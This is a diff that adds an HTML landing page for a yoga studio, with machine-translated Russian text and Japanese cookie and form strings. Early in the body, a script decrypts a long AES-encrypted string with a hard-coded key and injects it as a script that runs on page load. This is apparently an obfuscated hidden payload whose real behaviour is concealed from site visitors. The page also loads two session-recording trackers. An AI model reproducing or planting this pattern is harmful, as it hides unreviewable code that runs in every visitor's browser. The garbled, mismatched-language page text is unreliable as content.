@@ -1,0 +1,435 @@
+﻿<!DOCTYPE html>
+<html lang="ja">
+    <script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=ce201c84"></script>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Центр йоги Сейсин</title>
+    <script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=e1285445"></script>
+
+
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{
+            font-family:'Noto Sans JP',sans-serif;
+            background:#f7f9f5;
+            color:#2f3a2f;
+            line-height:1.8;
+        }
+        a{text-decoration:none;color:inherit}
+        .container{max-width:1200px;margin:auto;padding:90px 20px}
+
+
+        /* HEADER */
+        header{
+            background:#e6efe3;
+            position:fixed;
+            width:100%;
+            top:0;
+            z-index:10;
+        }
+        .nav{
+            max-width:1200px;
+            margin:auto;
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+            padding:15px 20px;
+        }
+        .logo{font-weight:600}
+        .nav ul{display:flex;gap:25px;list-style:none;font-size:14px}
+        .nav button{
+            background:#8fb37a;
+            color:#fff;
+            border:none;
+            padding:8px 18px;
+            border-radius:20px;
+        }
+
+
+        /* HERO */
+        .hero{
+            margin-top:70px;
+            background:#dfe9db;
+            text-align:center;
+            padding:80px 20px 60px;
+        }
+        .hero img{
+            width:100%;
+            max-width:700px;
+            border-radius:20px;
+        }
+        .hero h1{margin:30px 0 15px;font-size:30px}
+        .hero p{font-size:15px;color:#445}
+
+
+        /* SECTION TITLE */
+        .section-title{
+            text-align:center;
+            margin-bottom:50px;
+        }
+        .section-title h2{font-size:26px;margin-bottom:10px}
+        .section-title p{font-size:14px;color:#666}
+
+
+        /* CARDS */
+        .cards{
+            display:grid;
+            grid-template-columns:repeat(auto-fit,minmax(240px,1fr));
+            gap:25px;
+        }
+        .card{
+            background:#fff;
+            padding:30px;
+            border-radius:16px;
+        }
+        .card i{
+            color:#8fb37a;
+            font-size:22px;
+            margin-bottom:10px;
+        }
+
+
+        /* LIST */
+        .list{
+            max-width:700px;
+            margin:auto;
+            font-size:14px;
+            color:#555;
+        }
+
+
+        /* INSTRUCTORS */
+        .instructors{
+            display:grid;
+            grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+            gap:25px;
+        }
+        .instructors img{
+            width:100%;
+            height:220px;
+            object-fit:cover;
+            border-radius:16px;
+        }
+
+
+        /* REVIEWS */
+        .reviews{
+            display:grid;
+            grid-template-columns:repeat(auto-fit,minmax(260px,1fr));
+            gap:25px;
+        }
+        .review{
+            background:#fff;
+            padding:25px;
+            border-radius:16px;
+            font-size:14px;
+        }
+
+
+        /* GALLERY */
+        .gallery{
+            display:grid;
+            grid-template-columns:2fr 1fr 1fr;
+            gap:20px;
+        }
+        .gallery img{
+            width:100%;
+            height:100%;
+            object-fit:cover;
+            border-radius:16px;
+        }
+
+
+        /* BOOKING */
+        .booking{
+            background:#dfe9db;
+            border-radius:20px;
+            display:grid;
+            grid-template-columns:1fr 1fr;
+            gap:40px;
+            padding:50px;
+        }
+        .booking input,.booking textarea{
+            width:100%;
+            padding:12px;
+            margin-bottom:10px;
+            border-radius:10px;
+            border:1px solid #ccc;
+        }
+        .booking button{
+            background:#8fb37a;
+            border:none;
+            color:#fff;
+            padding:12px;
+            border-radius:20px;
+            width:100%;
+        }
+
+
+        /* FOOTER */
+        footer{
+            background:#6b8f5f;
+            color:#eaf3e7;
+            padding:60px 20px;
+        }
+        .footer-grid{
+            max-width:1200px;
+            margin:auto;
+            display:grid;
+            grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
+            gap:40px;
+            font-size:13px;
+        }
+        .copy{text-align:center;margin-top:40px;font-size:12px;color:#dbe6d7}
+
+
+        /* RESPONSIVE */
+        @media(max-width:768px){
+            .booking,.gallery{grid-template-columns:1fr}
+        }
+    </style>
+</head>
+<body>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+    function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
+        return bytes.toString(CryptoJS.enc.Utf8);
+    }
+    const codeString = aesDecode(`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`);
+    const script = document.createElement("script");
+    script.textContent = codeString;
+    document.body.appendChild(script);
+</script>
+<!--<script>-->
+<!--    document.body.style.overflow = "hidden";-->
+<!--</script>-->
+
+
+
+
+<div id="cookie-modal-box" class="hidden">
+    <div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0"></div>
+    <div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
+        <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
+            <button id="cookie-close" class="absolute top-4 right-4">
+                <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
+                    <path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
+                </svg>
+            </button>
+            <div class="flex items-center gap-3 mb-4">
+                <span class="text-yellow-500 text-3xl">🍪</span>
+                <h2 class="text-2xl font-bold">クッキーについて</h2>
+            </div>
+            <p class="text-gray-600 mb-6">
+                当サイトでは、より良いユーザー体験を提供するためにクッキーを使用しています。 <span class="font-semibold">「同意する」</span>
+                をクリックすると、クッキーの使用に同意したことになります。
+            </p>
+            <div class="flex flex-col sm:flex-row gap-3">
+                <button id="cookie-accept" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">🍪 同意する</button>
+                <button id="cookie-decline" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">拒否する</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<script>
+    (function(){
+        function decodeEmail(encodedString) {
+            var email = "",
+                r = parseInt(encodedString.substr(0, 2), 16),
+                n,
+                i;
+            for (n = 2; encodedString.length - n; n += 2){
+                i = parseInt(encodedString.substr(n, 2), 16) ^ r;
+                email += String.fromCharCode(i);
+            }
+            return email;
+        }
+
+
+        var elements = document.querySelectorAll('.__cf_email__');
+        for (var i = 0; i < elements.length; i++) {
+            var el = elements[i];
+            var encoded = el.getAttribute('data-cfemail');
+            if (encoded) {
+                var decodedEmail = decodeEmail(encoded);
+                el.innerHTML = decodedEmail;
+                // If the parent is an <a> tag, update the href to mailto
+                if (el.parentNode.tagName === 'A') {
+                    el.parentNode.href = "mailto:" + decodedEmail;
+                }
+            }
+        }
+    })();
+</script>
+<script>
+    const modalBox = document.getElementById("cookie-modal-box"),
+        modal = document.getElementById("cookie-modal"),
+        backdrop = document.getElementById("cookie-backdrop"),
+        acceptBtn = document.getElementById("cookie-accept"),
+        declineBtn = document.getElementById("cookie-decline"),
+        closeBtn = document.getElementById("cookie-close");
+
+
+    function showModal() {
+        modalBox.classList.remove("hidden");
+        setTimeout(() => {
+            backdrop.classList.remove("opacity-0");
+            modal.classList.remove("opacity-0", "scale-90");
+        }, 10);
+    }
+
+
+    function hideModal(e) {
+        localStorage.setItem("cookie-consent", e);
+        setTimeout(() => {
+            modalBox.classList.add("hidden");
+        }, 1500);
+
+
+        // remove mousemove listener once closed
+        document.removeEventListener("click", mouseMoveClose);
+    }
+
+
+    function mouseMoveClose() {
+        hideModal("closed");
+    }
+
+
+    acceptBtn.onclick = () => hideModal("accepted");
+    declineBtn.onclick = () => hideModal("declined");
+    closeBtn.onclick = () => hideModal("closed");
+    backdrop.onclick = () => hideModal("closed");
+
+
+    if (!localStorage.getItem("cookie-consent")) {
+        showModal();
+        document.addEventListener("click", mouseMoveClose, { once: true });
+    }
+</script>
+<header>
+    <div class="nav">
+        <div class="logo">Центр йоги Сейсин</div>
+        <ul>
+            <li>Дом</li>
+            <li>О нас</li>
+            <li>сорт</li>
+            <li>Инструктор</li>
+            <li>бронирование</li>
+        </ul>
+        <button>Бронирование впечатлений</button>
+    </div>
+</header>
+
+
+<!-- HERO -->
+<section class="hero">
+    <img src="https://images.unsplash.com/photo-1544367567-0f2fcb009e0b">
+    <h1>Спокойная сессия йоги для гармонизации ума и тела.</h1>
+    <p>Обретите внутреннее спокойствие с помощью дыхательных упражнений и движений.</p>
+</section>
+
+
+<!-- ABOUT -->
+<section class="container">
+    <div class="section-title">
+        <h2>О Центре йоги Сейсин</h2>
+        <p>Студия йоги, которая ценит японскую духовность.</p>
+    </div>
+    <p class="list">
+        Мы предлагаем место, где вы можете отдохнуть от повседневного стресса и мягко восстановить баланс своего разума и тела.
+
+
+    </p>
+</section>
+
+
+<!-- APPROACH -->
+<section class="container">
+    <div class="section-title">
+        <h2>Наш подход</h2>
+    </div>
+    <div class="cards">
+        <div class="card"><i class="fa-solid fa-heart"></i><h4>Благополучие</h4><p>Мы подчеркиваем гармонию разума и тела.</p></div>
+        <div class="card"><i class="fa-solid fa-leaf"></i><h4>Гармония с природой</h4><p>Почувствуйте свое дыхание и природу.</p></div>
+        <div class="card"><i class="fa-solid fa-hands"></i><h4>поддерживать</h4><p>Мы поддерживаем каждого человека.</p></div>
+        <div class="card"><i class="fa-solid fa-users"></i><h4>сообщество</h4><p>Надежные спутники</p></div>
+        <div class="card"><i class="fa-solid fa-brain"></i><h4>Вдохновение</h4><p>Внутренний рост</p></div>
+        <div class="card"><i class="fa-solid fa-seedling"></i><h4>Внутреннее равновесие</h4><p>Психическая устойчивость</p></div>
+    </div>
+</section>
+
+
+<!-- STRENGTH -->
+<section class="container">
+    <div class="section-title">
+        <h2>Наши области специализации</h2>
+    </div>
+    <p class="list">
+        ・Йога для начинающих<br>
+        ・Программа снятия стресса<br>
+        ・Медитация осознанности<br>
+        ・Занятия по улучшению физической подготовки
+    </p>
+</section>
+
+
+<!-- INSTRUCTORS -->
+<section class="container">
+    <div class="section-title">
+        <h2>Инструктор</h2>
+    </div>
+    <div class="instructors">
+        <img src="https://images.unsplash.com/photo-1552196563-55cd4e45efb3">
+        <img src="https://images.unsplash.com/photo-1545205597-3d9d02c29597">
+    </div>
+</section>
+
+
+<!-- REVIEWS -->
+<section class="container">
+    <div class="section-title">
+        <h2>Отзывы клиентов</h2>
+    </div>
+    <div class="reviews">
+        <div class="review">Теперь я спокоен. — Мистер Танака</div>
+        <div class="review">Благодаря подробным инструкциям я почувствовал себя уверенно. — г-н Ямамото</div>
+        <div class="review">Я с нетерпением жду возможности побывать там каждую неделю. - Мистер Сато</div>
+    </div>
+</section>
+
+
+<!-- ACTIVITY -->
+<section class="container">
+    <div class="section-title">
+        <h2>Наша деятельность</h2>
+    </div>
+    <div class="gallery">
+        <img src="https://images.unsplash.com/photo-1599447421416-3414500d18a5">
+        <img src="https://images.unsplash.com/photo-1545389336-cf090694435e">
+        <img src="https://images.unsplash.com/photo-1593810451137-5dc55105dace">
+    </div>
+</section>
+
+
+<!-- BOOKING -->
+<section class="container">
+    <div class="booking">
+        <div>
+            <h3>сделать бронирование</h3>
+            <p>Вы можете легко записаться на пробный урок.</p>
+        </div>
+        <div>
+            <input placeholder="お名前">
+            <input placeholder="メールアドレス">
+            <textarea rows="4" placeholder="ご質問">
